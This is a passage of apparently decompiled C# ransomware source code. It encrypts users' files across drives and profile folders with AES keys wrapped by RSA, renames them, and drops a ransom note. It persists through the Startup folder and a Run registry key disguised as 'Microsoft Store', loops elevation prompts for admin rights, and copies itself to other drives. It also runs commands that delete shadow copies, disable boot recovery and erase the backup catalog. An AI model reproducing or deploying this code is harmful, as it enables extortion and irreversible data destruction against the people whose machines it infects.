		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
